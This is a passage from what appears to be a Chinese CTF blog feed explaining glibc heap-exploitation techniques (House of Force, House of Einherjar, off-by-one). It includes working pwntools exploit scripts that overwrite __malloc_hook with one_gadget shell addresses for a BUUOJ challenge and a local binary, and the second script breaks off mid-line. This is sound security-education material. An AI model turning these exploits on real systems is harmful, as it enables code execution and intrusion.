è¿›è¡ŒéªŒè¯ï¼Œå¹¶ä¸”å°†ä¼šæ›´æ–°top chunkä½ç½®ï¼Œä»¥åŠsize</p><p>æˆ‘ä»¬ä¸»è¦å…³å¿ƒçš„æ˜¯å¯¹äºsizeçš„éªŒè¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE) <span class="hljs-comment">//nbæŒ‡æˆ‘ä»¬ç”³è¯·çš„å †å—å¤§å°</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œè®¾æƒ³ä¸€ä¸‹ï¼šå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼ï¼Œå°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯ã€‚ä¸€èˆ¬çš„åšæ³•æ˜¯æŠŠ top chunk çš„ size æ”¹ä¸º-1ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¯”è¾ƒæ—¶ä¼šæŠŠ size è½¬æ¢æˆæ— ç¬¦å·æ•°ï¼Œå› æ­¤ -1 ä¹Ÿå°±æ˜¯è¯´unsigned long ä¸­æœ€å¤§çš„æ•°ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•éƒ½å¯ä»¥é€šè¿‡éªŒè¯ã€‚</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>ç»¼åˆä¸Šé¢çš„èƒŒæ™¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼Œè¦æƒ³åˆ©ç”¨House of Forceï¼Œè¦æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li><p>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</p><ul><li>ä¸ºäº†èƒ½å°†sizeä¿®æ”¹ä¸º-1(0xFFFFFFFFFFFFFFFF)</li></ul></li><li><p>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</p><ul><li>ä¸ºäº†èƒ½å¤Ÿå°†top chunkæŠ¬å‡åˆ°æˆ‘ä»¬æƒ³å†™å…¥çš„åœ°å€é™„è¿‘ï¼Œä¸€èˆ¬ä¸ºhookï¼Œè€Œè¿™ä¹‹é—´çš„åç§»éå¸¸å¤§</li></ul></li></ul><h3 id="ä¾‹é¢˜BUU-gyctf-2020-force"><a href="#ä¾‹é¢˜BUU-gyctf-2020-force" class="headerlink" title="ä¾‹é¢˜BUU-gyctf_2020_force"></a>ä¾‹é¢˜BUU-gyctf_2020_force</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916151101226.png" alt="image-20210916151101226"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153042695.png" alt="image-20210916153042695"></p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153101689.png" alt="image-20210916153101689"></p><p>è¿›å…¥IDAï¼Œæ€»å…±å°±ä¸¤ä¸ªåŠŸèƒ½ï¼šä¸€ä¸ªæ˜¯ç”³è¯·å †å—ï¼Œå †å—å¤§å°æ— é™åˆ¶ï¼Œå¹¶ä¸”èƒ½è¿”å›ç»™å †åœ°å€ï¼Œç„¶åå¡«å…¥å†…å®¹æ˜¯å›ºå®šé•¿åº¦0x50ï¼›å¦å¤–ä¸€ä¸ªputsåŠŸèƒ½ã€‚ã€‚ã€‚å±ç”¨æ²¡æœ‰ï¼å› ä¸ºå­˜åœ¨å›ºå®šé•¿åº¦çš„å†™å…¥ï¼Œé‚£ä¹ˆåªè¦ç”³è¯·ä¸€ä¸ªå°å †å—å°±å¯ä»¥è¿›è¡Œæº¢å‡ºä¿®æ”¹top chunkçš„sizeä½ï¼Œæ‰€ä»¥House of Forceçš„ä¸¤ä¸ªæ¡ä»¶éƒ½è¾¾æˆäº†</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163309864.png" alt="image-20210916163309864"></p><p>å› ä¸ºç¨‹åºä¼šè¿”å›å †çš„åœ°å€ï¼Œç¨‹åºåˆä¸é™åˆ¶å †å—çš„å¤§å°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„å †å—ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šè°ƒç”¨mmapè¿›è¡Œåˆ†é…å †å—ï¼Œæ­¤æ—¶å †å—çš„åœ°å€ä¼šæ˜¯libcä¸­çš„ä¸€ä¸ªåœ°å€</p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163532720.png" alt="image-20210916163532720"></p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205725583.png" alt="image-20210916205725583"></p><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205619022.png" alt="image-20210916205619022"></p><p>ç„¶åç”³è¯·ä¸€ä¸ªå°äº0x50çš„å †å—ï¼Œè®©å †å—èƒ½è¿›è¡Œæº¢å‡ºè¦†ç›–top chunkçš„sizeä½ï¼Œä¿®æ”¹ä¸º-1ï¼ˆä¹Ÿå°±æ˜¯0xFFFFFFFFFFFFFFFFï¼‰ï¼ŒåŒæ—¶ä¹Ÿå€Ÿç€è¿™ä¸ªå †å—èƒ½è·å–åˆ°top chunkçš„åœ°å€ã€‚ç„¶åç›´æ¥ç”³è¯·ä¸€ä¸ªè¶…å¤§å †å—ï¼Œç›´æ¥å æ»¡top chunkä¸__malloc_hookä¹‹é—´é•¿åº¦ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—å»ä¿®æ”¹hookçš„ä¸ºone_gadgetå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>p.send(content)<br><span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>å…¶å®çœ‹å®Œwikiï¼Œæ„Ÿè§‰å°±æ˜¯ offbyone&amp;null çš„åˆ©ç”¨æ–¹å¼ï¼Œå€Ÿç€æº¢å‡ºä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„in_useä½ç½®ï¼Œç„¶åé€ æˆunlinkåˆ¶é€ å‡ºå †å—é‡å ï¼Œæ‰€ä»¥å°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œçœ‹æˆ‘çš„ offbyone&amp;null è¿™ç¯‡åšå®¢æ˜¯ä¸€æ ·çš„ï¼Œè€Œä¸”æˆ‘è¿˜æ›´æ–°äº†æ–°ç‰ˆæœ¬çš„åˆ©ç”¨ï¼Œå½“ç„¶æ˜¯æ¥è‡ªå¤§ä½¬çš„ï¼Œæˆ‘æ˜¯ä¸ªæ¬è¿å·¥ğŸ‘¶</p><p>è¿‡ç¨‹ï¼š</p><ul><li>éœ€è¦æœ‰æº¢å‡ºæ¼æ´å¯ä»¥ä¿®æ”¹ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ prev_size ä¸ INUSE éƒ¨åˆ†ã€‚</li><li>åœ¨ç›®çš„ chunk é™„è¿‘æ„é€ ç›¸åº”çš„ fake chunkï¼Œä»è€Œç»•è¿‡ unlink çš„æ£€æµ‹ã€‚</li></ul><h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House_Of_Lore"></a>House_Of_Lore</h2><h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House_Of_Rabbit"></a>House_Of_Rabbit</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; è¯¥ç³»åˆ—å†…å®¹è¾ƒå¤šï¼Œå°†ä¼šåœ¨è¾ƒé•¿æ—¶é—´æŒç»­æ›´æ–°&lt;/p&gt;
&lt;h2 id=&quot;House-of-Roman&quot;&gt;&lt;a href=&quot;#House-of-Roman&quot; class=&quot;headerlink&quot; title=&quot;House of Roman&quot;&gt;&lt;/a&gt;House of Roman&lt;/</summary>
      
    
    
    
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>offbyone&amp;null</title>
    <link href="http://example.com/2021/07/20/2021-07-26-offbyone&amp;null/"/>
    <id>http://example.com/2021/07/20/2021-07-26-offbyone&amp;null/</id>
    <published>2021-07-20T09:42:10.000Z</published>
    <updated>2021-10-13T08:01:21.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬å¸Œæœ›ç¨‹åºçš„å †æº¢å‡ºèƒ½å¤Ÿæº¢å‡ºåˆ°next chunkçš„fdæˆ–è€…bkå­—æ®µï¼Œè¿›è€Œå®Œæˆåˆ©ç”¨ã€‚ä½†æ˜¯è¿™æ ·çš„æƒ…å†µæ˜¯å¾ˆå°‘çš„ï¼Œå› è€Œéœ€è¦ä¸€ç§æ›´åŠ å¸¸è§çš„ç‰¹æ®Šçš„å †æº¢å‡ºå½¢å¼â€”â€”offbyoneï¼Œæº¢å‡ºå­—èŠ‚å°±å¦‚ä»–çš„åå­—ä¸€æ ·ï¼Œåªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ã€‚å®é™…ç”Ÿæ´»ä¸­è¿™ç§æ¼æ´å¾ˆå¸¸è§ï¼Œç¨‹åºå‘˜å¾ˆå®¹æ˜“çŠ¯è¿™ç§é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯å› ä¸ºè¾¹ç•Œæ£€æŸ¥ä¸ä¸¥æ ¼ç­‰æƒ…å†µã€‚</p><p>æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”³è¯·ä¸ª0xn8å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆå¤šå‡ºçš„ä¸€ä¸ªå­—èŠ‚æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeå­—æ®µï¼Ÿä¿®æ”¹äº†ä¹‹åï¼Œä¼šè®©ç¨‹åºè®¤ä¸ºè¿™ä¸ªå †å—çš„å¤§å°å°±æ˜¯ä½ ä¿®æ”¹çš„å¤§å°ï¼Œä»è€Œå¯¼è‡´overlap</p><p>å¦‚æœä½ åªæŠŠä¸€ä¸ªå †å—çš„sizeå˜å¤§ï¼Œç„¶åé‡Šæ”¾å†ç”³è¯·å‡ºæ¥ï¼Œæ‰©å¤§çš„sizeå°†ä¼šä»ä¸‹é¢çš„å †å—ä¸­å–æ¥ï¼Œå¹¶æŠŠé‡Œé¢çš„å†…å®¹æ¸…ç©ºï¼Œä¹Ÿå°±æ˜¯æƒ³è¦å†ä½¿ç”¨é‡Œé¢çš„å †å—ï¼Œéœ€è¦å»ä¿®å¤å¯¹åº”çš„å †å¤´ï¼ˆç”¨æ¥æ³„éœ²libcåŸºå€æ—¶ï¼Œéœ€è¦è¿™æ ·åˆ†å¼€æ¥æ“ä½œï¼‰</p><p>offbyoneæƒ…å½¢ï¼š</p><ul><li>strlenå‡½æ•°æŠŠnext chunkçš„sizeå­—æ®µä¹Ÿç»™è®¡å…¥è¿›å»ï¼Œé€ æˆæº¢å‡ºä¸€ä¸ªå­—èŠ‚</li></ul><p>åˆ©ç”¨æ–¹å¼ï¼šå †ä¸­æœ‰ABCDå››ä¸ªå·²ç»è¢«åˆ†é…çš„å¤§å°ä¸º0x70çš„chunkï¼Œç°åœ¨éƒ½æ˜¯ä½¿ç”¨çŠ¶æ€ã€‚ç„¶åAæ˜¯æˆ‘ä»¬è¿›è¡Œoffbyoneçš„chunkï¼Œæˆ‘ä»¬ç›®çš„æ˜¯å°†Bçš„sizeæ”¹æ‰ã€‚</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164209854.png" alt="image-20210726164209854" style="zoom: 80%;"><p>æˆ‘ä»¬è¾“å…¥â€™Aâ€™*0x68 + â€˜\xe1â€™,æ­¤æ—¶ï¼Œå †å—çš„å¸ƒå±€å¦‚ä¸‹ï¼š</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164413949.png" alt="image-20210726164413949" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°bçš„sizeè¢«æ”¹å¤§äº†ï¼Œæ­£å¥½è¦†ç›–åˆ°äº†cçš„æœ«å°¾ï¼Œæˆ‘ä»¬æ„é€ äº†chunkoverlapã€‚è¿™æ—¶å€™æˆ‘ä»¬å°†C freeæ‰ï¼Œä»–ä¼šè¿›å…¥fastbinã€‚æˆ‘ä»¬å†å°†B freeæ‰ï¼ŒB+Cè¿™ä¸€æ®µåŒºåŸŸä¼šè¿›å…¥unsorted binã€‚æˆ‘ä»¬å†æ¬¡ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0xd0çš„å †å—ï¼Œä¹Ÿå°±æ˜¯è¯´B+Cè¿™æ®µå†…å­˜è¢«æˆ‘ä»¬æ§åˆ¶äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶Cçš„fdå­—æ®µï¼Œå°±å¯ä»¥è¿›è¡Œfastbin attackäº†ã€‚</p><p>å½“ç„¶ï¼Œå®è·µåº”ç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸å±€é™è¯´å †å—å¤§å°éƒ½æ˜¯0x70ï¼Œ0x28ï¼Œ0x38éƒ½è¡Œï¼Œåªè¦èƒ½é€šè¿‡éªŒè¯å³å¯</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113130649.png" alt="image-20210726113130649"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œç„¶åè¿›å…¥idaçœ‹çœ‹ç¨‹åºä»£ç </p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113232848.png" alt="image-20210726113232848"></p><p>æ¼æ´ç‚¹å­˜åœ¨ä¸editå‡½æ•°é‡Œé¢ï¼Œåœ¨strlenå‡½æ•°é‡Œé¢ï¼Œè¿™ä¸ªå‡½æ•°åªæœ‰é‡åˆ°â€™\x00â€™æ‰ä¼šåœæ­¢è®¡æ•°ï¼Œå¦‚æœæˆ‘ä»¬ç”³è¯·0x78çš„å †å—ï¼Œå¹¶ä¸”å¡«æ»¡0x78ä¸ªå­—ç¬¦ï¼Œç„¶ååœ¨è¿™ä¸ªå †å—ä¸‹é¢è¿˜å­˜åœ¨ä¸€ä¸ªå †å—ï¼Œé‚£strlenå°±ä¼šæŠŠä¸‹ä¸€ä¸ªå †å—çš„sizeå­—æ®µä¹Ÿç»™ç»Ÿè®¡è¿›å»ï¼Œä»è€Œå¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¿®æ”¹ä¸‹ä¸€å †å—çš„sizeå­—æ®µã€‚</p><p>é‚£ä¹ˆè¯¥æ€ä¹ˆæ„é€ å‘¢ï¼Ÿå…ˆç”³è¯·å››ä¸ª0x68çš„å †å—ï¼ˆè‡³å°‘å››ä¸ªï¼‰ç¬¬ä¸€ä¸ªç”¨æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeå­—æ®µï¼Œç¬¬å››ä¸ªç”¨æ¥é˜²æ­¢ä¸top chunkåˆå¹¶ï¼Œä¸­é—´ä¸¤ä¸ªç”¨æ¥åˆ¶é€ overlap</p><p>æŠŠä¸‹ä¸€ä¸ªå †å—çš„sizeæ”¹ä¸ºä¸¤å€å¤§å°â€”â€”0xe1ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦è®©ç¨‹åºä¹Ÿè®¤ä¸ºè¢«ä¿®æ”¹çš„å †å—å¤§å°æ˜¯0xe0ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆåæŠŠç¬¬ä¸‰å—ã€ç¬¬äºŒå—éƒ½é‡Šæ”¾æ‰ï¼Œç¬¬ä¸‰å—è¿›å…¥fastbinï¼Œç¬¬äºŒå—ç”±äºsizeè¢«æ”¹åˆ™è¿›å…¥åˆ°unsortedbinä¸­ï¼Œå½»åº•è®©ç¨‹åºä»¥ä¸ºå¤§å°æ˜¯ä¸º0xe0ï¼Œæœ€ååªéœ€è¦æŠŠ0xe0çš„å †å—ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥ä¿®æ”¹å…¶ä¸­æœ¬æ¥æ˜¯ç¬¬ä¸‰å—çš„fdæŒ‡é’ˆ</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164722535.png" alt="image-20210726164722535"></p><p>æˆåŠŸåˆ¶é€ äº†overlapï¼Œä¸¤ä¸ª0x70çš„å †å—åˆå¹¶äº†</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164617715.png" alt="image-20210726164617715"></p><p>å¾ˆæ˜æ˜¾çœ‹åˆ°ï¼ŒfdæŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦åˆ†é…chunkçš„åœ°æ–¹</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164850626.png" alt="image-20210726164850626"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbyone&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span 